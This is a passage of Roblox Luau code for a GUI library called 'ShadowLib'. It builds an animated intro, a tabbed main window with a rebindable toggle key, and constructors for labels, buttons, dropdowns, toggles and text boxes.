	RippleFx.Completed:Wait()
	Ripple:Destroy()
end

-- SCREEN GUI --
local ShadowLib = Instance.new(""ScreenGui"")
ShadowLib.Name = ""ShadowLib""
if game:GetService(""RunService""):IsStudio() then
	ShadowLib.Parent = game.Players.LocalPlayer:WaitForChild(""PlayerGui"")
else
	ShadowLib.Parent = game:GetService('CoreGui')
end

-- INTRO --
if _G.Settings['Intro'] == true then
	local IntroFrame = Instance.new(""Frame"")
	local Background = Instance.new(""Frame"")
	local Pieces = Instance.new(""Frame"")
	local TitleFrame = Instance.new(""ImageButton"")
	local IntroText = Instance.new(""TextLabel"")
	
	IntroFrame.Name = ""IntroFrame""
	IntroFrame.Parent = ShadowLib
	IntroFrame.AnchorPoint = Vector2.new(0.5, 0.5)
	IntroFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	IntroFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
	IntroFrame.Size = UDim2.new(0.00999999978, 0, 0.00999999978, 0)
	
	Background.Name = ""Background""
	Background.Parent = IntroFrame
	Background.AnchorPoint = Vector2.new(0.5, 0.5)
	Background.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Background.Position = UDim2.new(0.5, 0, 0.5, 0)
	Background.Size = UDim2.new(1, 0, 1, 0)
	
	Pieces.Name = ""Pieces""
	Pieces.Parent = Background
	Pieces.AnchorPoint = Vector2.new(0.5, 0.5)
	Pieces.BackgroundColor3 = Color3.fromRGB(75, 0, 125)
	Pieces.Position = UDim2.new(0.5, 0, 0.5, 0)
	Pieces.Rotation = 45
	Pieces.Size = UDim2.new(8.1, 0, 32.25, 0)
	Pieces.ZIndex = 2
	
	Pieces_2 = Pieces:Clone()
	Pieces_2.Parent = Background
	Pieces_2.BackgroundColor3 = Color3.fromRGB(50, 0, 100)
	Pieces_2.Rotation = 0
	
	Pieces_3 = Pieces:Clone()
	Pieces_3.Parent = Background
	Pieces_3.BackgroundColor3 = Color3.fromRGB(0, 0, 100)
	Pieces_3.Rotation = 135
	
	TitleFrame.Name = ""TitleFrame""
	TitleFrame.Parent = IntroFrame
	TitleFrame.Active = false
	TitleFrame.AnchorPoint = Vector2.new(0.5, 0.5)
	TitleFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	TitleFrame.BackgroundTransparency = 1.000
	TitleFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
	TitleFrame.Rotation = 90
	TitleFrame.Selectable = false
	TitleFrame.Size = UDim2.new(8.1, 0, 35, 0)
	TitleFrame.ZIndex = 4
	TitleFrame.Image = ""rbxassetid://3570695787""
	TitleFrame.ImageColor3 = Color3.fromRGB(0, 0, 25)
	TitleFrame.ScaleType = Enum.ScaleType.Slice
	TitleFrame.SliceCenter = Rect.new(100, 100, 100, 100)
	TitleFrame.SliceScale = 0.100
	
	IntroText.Parent = TitleFrame
	IntroText.AnchorPoint = Vector2.new(0.5, 0.5)
	IntroText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	IntroText.BackgroundTransparency = 1.000
	IntroText.Position = UDim2.new(0.5, 0, 0.5, 0)
	IntroText.Rotation = -90.000
	IntroText.Size = UDim2.new(2.5, 0, 0.25, 0)
	IntroText.ZIndex = 5
	IntroText.Font = Enum.Font.GothamBlack
	IntroText.Text = _G.Settings['Name']
	IntroText.TextColor3 = Color3.fromRGB(255, 255, 255)
	IntroText.TextScaled = true
	IntroText.TextSize = 14
	IntroText.TextWrapped = true
	
	local Tween = MakeTween(IntroFrame, TweenInfo.new(1.5, Enum.EasingStyle.Sine), {Position = UDim2.new(0.5, 0, 0.5, 0)})
	Tween:Play()
	Tween.Completed:Wait()
	
	local Tween = MakeTween(IntroFrame, TweenInfo.new(2, Enum.EasingStyle.Sine), {Rotation = 720})
	Tween:Play()
	Tween.Completed:Wait()
	
	IntroFrame.Rotation = 0
	
	local Tween = MakeTween(IntroFrame, TweenInfo.new(0.5, Enum.EasingStyle.Sine), {Size = UDim2.new(0.0125, 0, 0.0125, 0)})
	Tween:Play()
	Tween.Completed:Wait()
	
	local Connection1 = IntroText.MouseEnter:Connect(function()
		MakeTween(IntroFrame, TweenInfo.new(0.1, Enum.EasingStyle.Sine), {Size = UDim2.new(0.013, 0, 0.013, 0)}):Play()
	end)
	
	local Connection2 = IntroText.MouseLeave:Connect(function()
		MakeTween(IntroFrame, TweenInfo.new(0.1, Enum.EasingStyle.Sine), {Size = UDim2.new(0.0125, 0, 0.0125, 0)}):Play()
	end)
	
	TitleFrame.MouseButton1Down:Wait()
	
	Connection1:Disconnect()
	Connection2:Disconnect()
	
	MakeTween(IntroFrame, TweenInfo.new(0.2, Enum.EasingStyle.Sine), {Size = UDim2.new(0.01, 0, 0.01, 0)}):Play()
	TitleFrame.MouseButton1Up:Wait()
	local Tween = MakeTween(IntroFrame, TweenInfo.new(0.4, Enum.EasingStyle.Bounce), {Size = UDim2.new(0.014, 0, 0.014, 0)})
	Tween:Play()
	Tween.Completed:Wait()
	MakeTween(IntroFrame, TweenInfo.new(1.5, Enum.EasingStyle.Bounce), {Rotation = 180, Position = UDim2.new(0.5, 0, 1.4, 0)}):Play()
	wait(1.5)
	IntroFrame:Destroy()
end

-- Instances --
local MainFrame = Instance.new(""ImageLabel"")
local InfoFrame = Instance.new(""ImageLabel"")
local Icon = Instance.new(""ImageButton"")
local UIAspectRatioConstraint = Instance.new(""UIAspectRatioConstraint"", Icon)
local Title = Instance.new(""TextLabel"")
local ImageLabel = Instance.new(""ImageLabel"")
local TabsControl = Instance.new(""ScrollingFrame"")
local TabsListLayout = Instance.new(""UIListLayout"")
local TabControlTitle = Instance.new(""TextLabel"")
local KeyBind = Instance.new(""Frame"")
local Text = Instance.new(""TextLabel"")
local Bind = Instance.new(""ImageButton"")
local Key = Instance.new(""TextLabel"")

--Properties --
MainFrame.Name = ""MainFrame""
MainFrame.Parent = ShadowLib
MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
MainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainFrame.BackgroundTransparency = 1.000
MainFrame.Position = UDim2.new(0.5, 0, 1.35, 0)
MainFrame.ClipsDescendants = true
MainFrame.Size = UDim2.new(0.45, 0, 0.55, 0)
MainFrame.Image = ""rbxassetid://3570695787""
MainFrame.ImageColor3 = Color3.fromRGB(0, 0, 0)
MainFrame.ImageTransparency = 0.100
MainFrame.ScaleType = Enum.ScaleType.Slice
MainFrame.SliceCenter = Rect.new(100, 100, 100, 100)
MainFrame.SliceScale = 0.200

InfoFrame.Name = ""InfoFrame""
InfoFrame.Parent = MainFrame
InfoFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
InfoFrame.BackgroundTransparency = 1.000
InfoFrame.Size = UDim2.new(0.300000012, 0, 1, 0)
InfoFrame.Size = UDim2.new(0, InfoFrame.AbsoluteSize.X, InfoFrame.Size.Y.Scale, 0)
InfoFrame.Image = ""rbxassetid://3570695787""
InfoFrame.ImageColor3 = Color3.fromRGB(25, 25, 25)
InfoFrame.ImageTransparency = 0.100
InfoFrame.ScaleType = Enum.ScaleType.Slice
InfoFrame.SliceCenter = Rect.new(100, 100, 100, 100)
InfoFrame.SliceScale = 0.200

Icon.Name = ""Icon""
Icon.Parent = InfoFrame
Icon.AnchorPoint = Vector2.new(0.5, 0.5)
Icon.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Icon.BackgroundTransparency = 1.000
Icon.Position = UDim2.new(0.5, 0, 0.235, 0)
Icon.Size = UDim2.new(0.7, 0, 0.25, 0)
Icon.Image = ""http://www.roblox.com/asset/?id=18146352470""

Title.Name = ""Title""
Title.Parent = InfoFrame
Title.AnchorPoint = Vector2.new(0.5, 0)
Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Title.BackgroundTransparency = 1.000
Title.Position = UDim2.new(0.5, 0, 0.375, 0)
Title.Size = UDim2.new(0.95, 0, 0.1, 0)
Title.Font = Enum.Font.GothamBold
Title.Text = _G.Settings['Name']
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextScaled = true
Title.TextSize = 14.000
Title.TextWrapped = true

TabsControl.Name = ""TabsControl""
TabsControl.Parent = InfoFrame
TabsControl.Active = true
TabsControl.AnchorPoint = Vector2.new(0.5, 1)
TabsControl.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TabsControl.BackgroundTransparency = 1.000
TabsControl.BorderSizePixel = 0
TabsControl.Position = UDim2.new(0.5, 0, 0.975, 0)
TabsControl.Size = UDim2.new(1, 0, 0.400000006, 0)
TabsControl.CanvasPosition = Vector2.new(0, 418.880005)
TabsControl.ScrollBarThickness = 5

TabsListLayout.Name = 'TabsListLayout'
TabsListLayout.Parent = TabsControl
TabsListLayout.Padding = UDim.new(0, 5)
TabsListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
TabsListLayout.SortOrder = Enum.SortOrder.LayoutOrder

TabControlTitle.Name = ""Title""
TabControlTitle.Parent = TabsControl
TabControlTitle.Active = true
TabControlTitle.AnchorPoint = Vector2.new(0.5, 0.5)
TabControlTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TabControlTitle.BackgroundTransparency = 1.000
TabControlTitle.Position = UDim2.new(0.5, 0, 0.5, 0)
TabControlTitle.Selectable = true
TabControlTitle.Size = UDim2.new(0.9, 0, 0, 35)
TabControlTitle.Font = Enum.Font.GothamBold
TabControlTitle.Text = ""Tabs""
TabControlTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
TabControlTitle.TextScaled = true
TabControlTitle.TextSize = 14.000
TabControlTitle.TextWrapped = true

KeyBind.Name = ""KeyBind""
KeyBind.Parent = InfoFrame
KeyBind.AnchorPoint = Vector2.new(0.5, 0)
KeyBind.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
KeyBind.BackgroundTransparency = 1.000
KeyBind.Position = UDim2.new(0.5, 0, 0.48, 0)
KeyBind.Size = UDim2.new(0.75, 0, 0.05, 0)

Text.Name = ""Text""
Text.Parent = KeyBind
Text.AnchorPoint = Vector2.new(0, 0.5)
Text.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Text.BackgroundTransparency = 1.000
Text.Position = UDim2.new(0.325, 0, 0.5, -1)
Text.Size = UDim2.new(0.65, 0, 1, 0)
Text.Font = Enum.Font.GothamSemibold
Text.Text = "" to toggle UI""
Text.TextColor3 = Color3.fromRGB(255, 255, 255)
Text.TextScaled = true
Text.TextSize = 14.000
Text.TextWrapped = true
Text.TextXAlignment = Enum.TextXAlignment.Left

Bind.Name = ""Bind""
Bind.Parent = KeyBind
Bind.Active = false
Bind.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Bind.BackgroundTransparency = 1.000
Bind.Position = UDim2.new(0.0250000004, 0, 0, 0)
Bind.Selectable = false
Bind.Size = UDim2.new(0.300000012, 0, 1, 0)
Bind.Image = ""rbxassetid://3570695787""
Bind.ImageColor3 = Color3.fromRGB(0, 0, 0)
Bind.ImageTransparency = 0.200
Bind.ScaleType = Enum.ScaleType.Slice
Bind.SliceCenter = Rect.new(100, 100, 100, 100)
Bind.SliceScale = 0.050

Key.Name = ""Key""
Key.Parent = Bind
Key.AnchorPoint = Vector2.new(0.5, 0.5)
Key.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Key.BackgroundTransparency = 1.000
Key.Position = UDim2.new(0.5, 0, 0.5, 0)
Key.Size = UDim2.new(1, 0, 1, 0)
Key.Font = Enum.Font.GothamBlack
Key.Text = _G.Settings['Keybind']
Key.TextColor3 = Color3.fromRGB(255, 255, 255)
Key.TextScaled = true
Key.TextSize = 14.000
Key.TextWrapped = true

-- Scripts --

MakeTween(MainFrame, TweenInfo.new(0.75, Enum.EasingStyle.Sine), {Position = UDim2.new(0.5, 0, 0.5, 0)}):Play()

-- Toggle
local Cooldown = false

local function Toggle(actionName, inputState, inputObject)
	if inputState == Enum.UserInputState.End or Cooldown == true then
		return
	end
	Cooldown = true
	if MainFrame.Visible == true then
		CurrentTab.Value = false
		local TweenClose = MakeTween(MainFrame, TweenInfo.new(1, Enum.EasingStyle.Sine), {Size = UDim2.new(0, InfoFrame.AbsoluteSize.X, 0.55, 0)})
		TweenClose:Play()
		TweenClose.Completed:Wait()
		wait(0.5)
		local TweenOut = MakeTween(MainFrame, TweenInfo.new(0.75, Enum.EasingStyle.Sine), {Position = UDim2.new(0.5, 0, 1.35, 0)})
		TweenOut:Play()
		TweenOut.Completed:Wait()
		MainFrame.Visible = false
	else
		MainFrame.Visible = true
		local TweenIn = MakeTween(MainFrame, TweenInfo.new(0.75, Enum.EasingStyle.Sine), {Position = UDim2.new(0.5, 0, 0.5, 0)})
		TweenIn:Play()
		TweenIn.Completed:Wait()
		wait(0.5)
		local TweenOpen = MakeTween(MainFrame, TweenInfo.new(0.85, Enum.EasingStyle.Sine), {Size = UDim2.new(0.45, 0, 0.55, 0)})
		TweenOpen:Play()
		TweenOpen.Completed:Wait()
		CurrentTab.Value = true
	end
	Cooldown = false
end

CONTEXTACTIONSERVICE:BindAction(""ToggleUI"", Toggle, false, Enum.KeyCode[_G.Settings['Keybind']])

-- Change bind
Bind.MouseButton1Click:Connect(function()
	Bind.Key.Text = '...'
end)

USERINPUTSERVICE.InputBegan:connect(function(input, gameProcessedEvent)
	local KeyName = USERINPUTSERVICE:GetStringForKeyCode(input.KeyCode)
	
	if gameProcessedEvent or Key.Text ~= '...' or KeyName == '' then
		return
	end
	CONTEXTACTIONSERVICE:UnbindAction(""ToggleUI"")
	Key.Text = KeyName
	CONTEXTACTIONSERVICE:BindAction(""ToggleUI"", Toggle, false, input.KeyCode)
end)

-- Expanding tab section
TabsControl.CanvasSize = UDim2.new(0, 0, 0, TabsListLayout.AbsoluteContentSize.Y)
TabsListLayout:GetPropertyChangedSignal(""AbsoluteContentSize""):Connect(function()
	TabsControl.CanvasSize = UDim2.new(0, 0, 0, TabsListLayout.AbsoluteContentSize.Y)
end)

Icon.MouseEnter:Connect(function()
	MakeTween(Icon, TweenInfo.new(0.1, Enum.EasingStyle.Sine), {Size = UDim2.new(0.75, 0, 0.3, 0)}):Play()
end)

Icon.MouseLeave:Connect(function()
	MakeTween(Icon, TweenInfo.new(0.1, Enum.EasingStyle.Sine), {Size = UDim2.new(0.7, 0, 0.25, 0)}):Play()
end)

Icon.MouseButton1Down:Connect(function()
	MakeTween(Icon, TweenInfo.new(0.1, Enum.EasingStyle.Sine), {Size = UDim2.new(0.65, 0, 0.2, 0)}):Play()
	Icon.MouseButton1Up:Wait()
	MakeTween(Icon, TweenInfo.new(0.5, Enum.EasingStyle.Elastic), {Size = UDim2.new(0.75, 0, 0.3, 0)}):Play()
end)

ShadowLib:GetPropertyChangedSignal(""AbsoluteSize""):Connect(function()
	InfoFrame.Size = UDim2.new(0.300000012, 0, 1, 0)
	InfoFrame.Size = UDim2.new(0, InfoFrame.AbsoluteSize.X, InfoFrame.Size.Y.Scale, 0)
end)


function Library:CreateTab(Name)
	local TabLibrary = {}
	
	-- Tab--
	local Tab = Instance.new(""ImageButton"")
	local Title = Instance.new(""TextLabel"")
	local Circle = Instance.new(""ImageLabel"")
	
	Tab.Name = Name
	Tab.Parent = TabsControl
	Tab.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	Tab.ClipsDescendants = true
	Tab.Size = UDim2.new(0.9, 0, 0, 40)
	Tab.AutoButtonColor = false
	
	Title.Name = ""Title""
	Title.Parent = Tab
	Title.Active = true
	Title.AnchorPoint = Vector2.new(0.5, 0.5)
	Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Title.BackgroundTransparency = 1.000
	Title.Position = UDim2.new(0.5, 0, 0.5, 0)
	Title.Selectable = true
	Title.Size = UDim2.new(0.800000012, 0, 0.800000012, 0)
	Title.Font = Enum.Font.GothamBold
	Title.Text = Name
	Title.TextColor3 = Color3.fromRGB(255, 255, 255)
	Title.TextScaled = true
	Title.TextSize = 14.000
	Title.TextWrapped = true
	
	-- Frame --
	local TabFrame = Instance.new(""Frame"")
	local UIGridLayout = Instance.new(""UIGridLayout"")
	local Opened = Instance.new('BoolValue')
	
	TabFrame.Name = Name
	TabFrame.Parent = MainFrame
	TabFrame.AnchorPoint = Vector2.new(0, 0.5)
	TabFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	TabFrame.BackgroundTransparency = 0.9
	TabFrame.BorderSizePixel = 0
	TabFrame.ClipsDescendants = true
	TabFrame.Position = UDim2.new(0.300000012, 0, 0.5, 0)
	TabFrame.Size = UDim2.new(0.7, 0, 1, 0)
	TabFrame.Visible = false
	
	UIGridLayout.Parent = TabFrame
	UIGridLayout.FillDirection = Enum.FillDirection.Vertical
	UIGridLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
	UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
	UIGridLayout.VerticalAlignment = Enum.VerticalAlignment.Center
	UIGridLayout.CellPadding = UDim2.new(0.025, 0, 0.01, 0)
	UIGridLayout.CellSize = UDim2.new(0.4, 0, 0.1, 0)
	UIGridLayout.FillDirectionMaxCells = 8
	
	Opened.Name = 'Opened'
	Opened.Parent = TabFrame
	Opened.Value = false
	
	-- Scripts --
	Opened:GetPropertyChangedSignal(""Value""):Connect(function()
		if Opened.Value == true then
			MakeTween(Tab, TweenInfo.new(0.1, Enum.EasingStyle.Sine), {Size = UDim2.new(0.92, 0, 0, 50)}):Play()
			Tab.BackgroundColor3 = Color3.fromRGB(5, 5, 15)
		else
			MakeTween(Tab, TweenInfo.new(0.1, Enum.EasingStyle.Sine), {Size = UDim2.new(0.9, 0, 0, 40)}):Play()
			Tab.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		end
		TabFrame.Visible = Opened.Value
	end)
	
	Tab.MouseButton1Down:Connect(function(x, y)
		if Cooldown == true then
			return
		end
		for i,v in ipairs(MainFrame:GetChildren()) do
			local OpenedValue = v:FindFirstChild('Opened')
			if OpenedValue and v ~= TabFrame then
				OpenedValue.Value = false
			end
		end
		Opened.Value = true
		CurrentTab = Opened
		Ripple(Tab, x, y)
	end)
	
	if not CurrentTab then
		coroutine.wrap(function()
			CurrentTab = Opened
			wait(0.1)
			Opened.Value = true
		end)()
	end
	
	
	function TabLibrary:Label(LabelText)
		local NewTextLabel = Instance.new(""TextLabel"")
		
		NewTextLabel.Name = ""TEXTLABEL""
		NewTextLabel.Parent = TabFrame
		NewTextLabel.AnchorPoint = Vector2.new(0.5, 1)
		NewTextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		NewTextLabel.BackgroundTransparency = 1.000
		NewTextLabel.Position = UDim2.new(0.5, 0, 1, 0)
		NewTextLabel.Size = UDim2.new(0, 200, 0, 50)
		NewTextLabel.Font = Enum.Font.GothamBlack
		NewTextLabel.Text = LabelText
		NewTextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
		NewTextLabel.TextScaled = true
		NewTextLabel.TextSize = 14.000
		NewTextLabel.TextWrapped = true
		NewTextLabel.TextYAlignment = Enum.TextYAlignment.Bottom
		
		local LabelLibrary = {}
		function LabelLibrary:Refresh(RefreshText)
			NewTextLabel.Text = RefreshText
		end
		return LabelLibrary
	end
	
	function TabLibrary:Button(Text, Function)
		local Button = Instance.new(""ImageButton"")
		local Title = Instance.new(""TextLabel"")
		
		Button.Name = ""Button""
		Button.Parent = TabFrame
		Button.Active = false
		Button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Button.ClipsDescendants = true
		Button.AutoButtonColor = false
		Button.Selectable = false
		Button.Size = UDim2.new(0, 100, 0, 100)
		
		Title.Name = ""Title""
		Title.Parent = Button
		Title.AnchorPoint = Vector2.new(0.5, 0.5)
		Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Title.BackgroundTransparency = 1.000
		Title.Position = UDim2.new(0.5, 0, 0.5, 0)
		Title.Size = UDim2.new(0.8, 0, 0.8, 0)
		Title.Text = Text
		Title.Font = Enum.Font.GothamBold
		Title.TextColor3 = Color3.fromRGB(255, 255, 255)
		Title.TextScaled = true
		Title.TextSize = 14.000
		Title.TextWrapped = true
		
		local ClickFunction = Function
		
		Button.MouseButton1Down:Connect(function(x, y)
			coroutine.wrap(ClickFunction)()
			Ripple(Button, x, y)
		end)
		
		local ButtonLibrary = {}
		function ButtonLibrary:Refresh(RefreshText, RefreshFunction)
			Title.Text = RefreshText
			ClickFunction = RefreshFunction
		end
		return ButtonLibrary
	end
	
	function TabLibrary:Dropdown(Placeholder, Contents, Function)
		local Dropdown = Instance.new(""Frame"")
		local Arrow = Instance.new(""ImageButton"")
		local UIAspectRatioConstraint = Instance.new(""UIAspectRatioConstraint"")
		local Output = Instance.new(""TextLabel"")
		local Selection = Instance.new(""ScrollingFrame"")
		local SelectionList = Instance.new(""UIListLayout"")
		
		Dropdown.Name = ""Dropdown""
		Dropdown.Parent = TabFrame
		Dropdown.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Dropdown.Size = UDim2.new(0, 100, 0, 100)
		
		Arrow.Name = ""Arrow""
		Arrow.Parent = Dropdown
		Arrow.AnchorPoint = Vector2.new(1, 0.5)
		Arrow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Arrow.BackgroundTransparency = 1.000
		Arrow.Position = UDim2.new(0.980000019, 0, 0.5, 0)
		Arrow.Rotation = 180.000
		Arrow.Size = UDim2.new(0.150000006, 0, 0.449999988, 0)
		Arrow.Image = ""http://www.roblox.com/asset/?id=71659683""
		
		UIAspectRatioConstraint.Parent = Arrow
		
		Output.Name = ""Output""
		Output.Parent = Dropdown
		Output.AnchorPoint = Vector2.new(0, 0.5)
		Output.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Output.BackgroundTransparency = 1.000
		Output.Position = UDim2.new(0, 0, 0.5, 0)
		Output.Size = UDim2.new(0.899999976, 0, 0.800000012, 0)
		Output.Font = Enum.Font.GothamBold
		Output.Text = Placeholder
		Output.TextColor3 = Color3.fromRGB(255, 255, 255)
		Output.TextScaled = true
		Output.TextSize = 14.000
		Output.TextWrapped = true
		
		Selection.Name = ""Selection""
		Selection.Parent = Dropdown
		Selection.Active = true
		Selection.AnchorPoint = Vector2.new(0.5, 0)
		Selection.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Selection.Position = UDim2.new(0.5, 0, 1, 0)
		Selection.Size = UDim2.new(1, 0, 0, 0)
		Selection.Visible = false
		Selection.ZIndex = 2
		Selection.CanvasSize = UDim2.new(0, 0, 4, 0)
		Selection.ScrollBarThickness = 6
		
		SelectionList.Name = ""SelectionList""
		SelectionList.Parent = Selection
		SelectionList.SortOrder = Enum.SortOrder.LayoutOrder
		
		local ChangeFunction = Function
		
		local function CreateContents(List)
			for i,v in ipairs(List) do
				local Option = Instance.new(""TextButton"")
				Option.Name = v
				Option.Parent = Selection
				Option.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				Option.BackgroundTransparency = 1.000
				Option.Size = UDim2.new(0.95, 0, 0, 35)
				Option.ZIndex = 3
				Option.Font = Enum.Font.Arial
				Option.Text = v
				Option.TextColor3 = Color3.fromRGB(240, 240, 240)
				Option.TextScaled = true
				Option.TextSize = 14.000
				Option.TextWrapped = true
				Option.MouseButton1Down:Connect(function()
					Output.Text = Option.Text
					coroutine.wrap(ChangeFunction)(Option.Text)
					MakeTween(Arrow, TweenInfo.new(0.5, Enum.EasingStyle.Sine), {Rotation = 180}):Play()
					MakeTween(Selection, TweenInfo.new(0.5, Enum.EasingStyle.Sine), {Size = UDim2.new(1, 0, 0, 0)}):Play()
					wait(0.5)
					Selection.Visible = false
				end)
			end
		end
		
		CreateContents(Contents)
		
		Arrow.MouseButton1Down:Connect(function(x,y)
			if Selection.Visible == true then
				MakeTween(Arrow, TweenInfo.new(0.5, Enum.EasingStyle.Sine), {Rotation = 180}):Play()
				MakeTween(Selection, TweenInfo.new(0.5, Enum.EasingStyle.Sine), {Size = UDim2.new(1, 0, 0, 0)}):Play()
				wait(0.5)
				Selection.Visible = false
			else
				Selection.Visible = true
				MakeTween(Arrow, TweenInfo.new(0.5, Enum.EasingStyle.Sine), {Rotation = 90}):Play()
				MakeTween(Selection, TweenInfo.new(0.5, Enum.EasingStyle.Sine), {Size = UDim2.new(1, 0, 2.5, 0)}):Play()
			end
			
		end)
		
		Selection.CanvasSize = UDim2.new(0, 0, 0, SelectionList.AbsoluteContentSize.Y)
		SelectionList:GetPropertyChangedSignal(""AbsoluteContentSize""):Connect(function()
			Selection.CanvasSize = UDim2.new(0, 0, 0, SelectionList.AbsoluteContentSize.Y)
		end)
		
		local DropDownLibrary = {}
		function DropDownLibrary:Refresh(RefreshPlaceholder, RefreshContents, RefreshFunction)
			Output.Text = RefreshPlaceholder
			for i,v in ipairs(Selection:GetChildren()) do
				if v:IsA('TextButton') then
					v:Destroy()
				end
			end
			CreateContents(RefreshContents)
			ChangeFunction = RefreshFunction
		end
		return DropDownLibrary
	end
	
	function TabLibrary:Toggle(ToggleText, Status, Function)
		local ToggleFrame = Instance.new(""ImageButton"")
		local TextLabel = Instance.new(""TextLabel"")
		local ToggleBox = Instance.new(""ImageLabel"")
		local ToggleRatio = Instance.new(""UIAspectRatioConstraint"")
		
		ToggleFrame.Name = ""Toggle""
		ToggleFrame.Parent = TabFrame
		ToggleFrame.Active = false
		ToggleFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ToggleFrame.BackgroundTransparency = 1.000
		ToggleFrame.Selectable = false
		ToggleFrame.Size = UDim2.new(0, 100, 0, 100)
		
		TextLabel.Parent = ToggleFrame
		TextLabel.AnchorPoint = Vector2.new(0, 0.5)
		TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		TextLabel.BackgroundTransparency = 1.000
		TextLabel.Position = UDim2.new(0, 0, 0.5, 0)
		TextLabel.Size = UDim2.new(0.75, 0, 0.699999988, 0)
		TextLabel.Font = Enum.Font.GothamBlack
		TextLabel.Text = ""TOGGLE""
		TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
		TextLabel.TextScaled = true
		TextLabel.TextSize = 14.000
		TextLabel.TextWrapped = true
		
		ToggleBox.Name = ""ToggleBox""
		ToggleBox.Parent = ToggleFrame
		ToggleBox.AnchorPoint = Vector2.new(0, 0.5)
		ToggleBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ToggleBox.BackgroundTransparency = 1.000
		ToggleBox.Position = UDim2.new(0.774999976, 0, 0.5, 0)
		ToggleBox.Size = UDim2.new(0.2, 0, 0.6, 0)
		ToggleBox.ClipsDescendants = true
		if Status == true then
			ToggleBox.Image = 'http://www.roblox.com/asset/?id=5228569533'
		else
			ToggleBox.Image = ""http://www.roblox.com/asset/?id=1264513374""
		end
		
		ToggleRatio.Name = ""ToggleRatio""
		ToggleRatio.Parent = ToggleBox
		
		local ToggleSwitch = Status
		
		local ToggleFunction = Function
		
		local function CheckToggle()
			coroutine.wrap(ToggleFunction)(ToggleSwitch)
			if ToggleSwitch == true then
				local Ripple = Instance.new(""ImageLabel"")
				Ripple.Name = ""Circle""
				Ripple.Parent = ToggleBox
				Ripple.BackgroundTransparency = 1
				Ripple.AnchorPoint = Vector2.new(0.5, 0.5)
				Ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
				Ripple.Image = ""rbxassetid://3570695787""
				Ripple.ImageTransparency = 0.8
				Ripple.ScaleType = Enum.ScaleType.Slice
				Ripple.SliceCenter = Rect.new(100, 100, 100, 100)
				local RippleFx = MakeTween(Ripple, TweenInfo.new(0.15), {Size = UDim2.new(1.5, 0, 1.5, 0), ImageTransparency = 0})
				RippleFx:Play()
				RippleFx.Completed:Wait()
				ToggleBox.Image = 'http://www.roblox.com/asset/?id=5228569533'
				Ripple:Destroy()
			else
				ToggleBox.Image = ""http://www.roblox.com/asset/?id=1264513374""
				local Ripple = Instance.new(""ImageLabel"")
				Ripple.Name = ""Circle""
				Ripple.Parent = ToggleBox
				Ripple.BackgroundTransparency = 1
				Ripple.AnchorPoint = Vector2.new(0.5, 0.5)
				Ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
				Ripple.Size = UDim2.new(1.5, 0, 1.5, 0)
				Ripple.Image = ""rbxassetid://3570695787""
				Ripple.ImageTransparency = 0
				Ripple.ScaleType = Enum.ScaleType.Slice
				Ripple.SliceCenter = Rect.new(100, 100, 100, 100)
				local RippleFx = MakeTween(Ripple, TweenInfo.new(0.25), {Size = UDim2.new(0, 0, 0, 0), ImageTransparency = 1})
				RippleFx:Play()
				RippleFx.Completed:Wait()
				Ripple:Destroy()
			end
		end
		
		ToggleFrame.MouseButton1Click:Connect(function()
			ToggleSwitch = not ToggleSwitch
			CheckToggle()
		end)
		
		local ToggleLibrary = {}
		function ToggleLibrary:Refresh(RefreshToggleText, RefreshStatus, RefreshFunction)
			TextLabel.Text = RefreshToggleText
			ToggleSwitch = RefreshStatus
			CheckToggle()
			ToggleFunction = RefreshFunction
		end
	end
	
	function TabLibrary:TextBox(TitleText, Placeholder, Function)
		local TextInput = Instance.new(""Frame"")
		local Title = Instance.new(""TextLabel"")
		local TextBoxFrame = Instance.new(""ImageLabel"")
		local TextBox = Instance.new(""TextBox"")
		
		TextInput.Name = ""TextInput""
		TextInput.Parent = TabFrame
		TextInput.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		TextInput.BackgroundTransparency = 1.000
		TextInput.Size = UDim2.new(0, 100, 0, 100)
		
		Title.Name = ""Text""
		Title.Parent = TextInput
		Title.AnchorPoint = Vector2.new(0, 0.5)
		Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Title.BackgroundTransparency = 1.000
		Title.Position = UDim2.new(0, 0, 0.5, 0)
		Title.Size = UDim2.new(0.649999976, 0, 0.850000024, 0)
		Title.Font = Enum.Font.GothamBlack
